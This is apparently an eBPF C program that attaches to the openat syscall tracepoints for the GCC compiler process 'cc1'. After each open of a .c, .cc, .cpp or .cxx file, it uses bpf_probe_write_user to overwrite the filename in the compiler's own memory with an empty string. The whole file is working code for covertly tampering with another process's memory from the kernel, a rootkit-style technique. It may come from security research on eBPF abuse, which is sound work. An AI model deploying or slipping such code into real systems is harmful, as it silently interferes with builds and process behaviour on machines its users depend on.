#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "modify_file_name.h"
#include "../../config/time_config.h"

char LICENSE[] SEC("license") = "Dual BSD/GPL";

struct {
  __uint(type, BPF_MAP_TYPE_RINGBUF);
  __uint(max_entries, 256 * 1024);
} rb SEC(".maps");

struct {
  __uint(type, BPF_MAP_TYPE_HASH);
  __uint(max_entries, 8192);
  __type(key, tid_t);
  __type(value, u64);
} filenames SEC(".maps");

bool comm_filter(char *comm) {
  if (!(__builtin_memcmp("cc1\0", comm, 4) == 0)) {
    return 0;
  }
  return 1;
}

SEC("tracepoint/syscalls/sys_enter_openat")
int handle_enter_openat(struct trace_event_raw_sys_enter *ctx) {
  tid_t tid = bpf_get_current_pid_tgid();

  char comm[16];
  bpf_get_current_comm(comm, 16);
  if (!comm_filter(comm)) {
    return 0;
  }

  char *filename_p = (char *)ctx->args[1];

  bpf_map_update_elem(&filenames, &tid, &filename_p, BPF_ANY);

  return 0;
}

SEC("tracepoint/syscalls/sys_exit_openat")
int handle_exit_openat(struct trace_event_raw_sys_exit *ctx) {
  char comm[16];
  bpf_get_current_comm(comm, 16);
  if (!comm_filter(comm)) {
    return 0;
  }

  tid_t tid = bpf_get_current_pid_tgid();

  long unsigned int *filename_pp = bpf_map_lookup_elem(&filenames, &tid);
  if (filename_pp == NULL) {
    return 0;
  }
  bpf_map_delete_elem(&filenames, &tid);

  char *filename_p = (char *)*filename_pp;
  char filename[32];
  bpf_probe_read_user(&filename, 32, filename_p);

  bool isToModify = false;

  for (int i = 0; i <= 32 - 3; i++) {
    if (filename[i] == '.' && filename[i + 1] == 'c' &&
        filename[i + 2] == '\0') {
      isToModify = true;
      break;
    }
  }

  for (int i = 0; i <= 32 - 4; i++) {
    if (filename[i] == '.' && filename[i + 1] == 'c' &&
        filename[i + 2] == 'c' && filename[i + 3] == '\0') {
      isToModify = true;
      break;
    }
  }

  for (int i = 0; i <= 32 - 5; i++) {
    if (filename[i] == '.' && filename[i + 1] == 'c' &&
        filename[i + 2] == 'p' && filename[i + 3] == 'p' &&
        filename[i + 4] == '\0') {
      isToModify = true;
      break;
    }
    if (filename[i] == '.' && filename[i + 1] == 'c' &&
        filename[i + 2] == 'x' && filename[i + 3] == 'x' &&
        filename[i + 4] == '\0') {
      isToModify = true;
      break;
    }
  }

  if (!isToModify) {
    return 0;
  }

  bpf_printk("[sys_exit_openat] OVERWRITING filename at %p from %s to empty",
             filename_p, filename);
  char replace_filename[1] = "";
  bool success =
      bpf_probe_write_user((char *)filename_p, (char *)&replace_filename, 1);
  bpf_printk("[sys_exit_openat] RESULT %d", success);

  return 0;
}
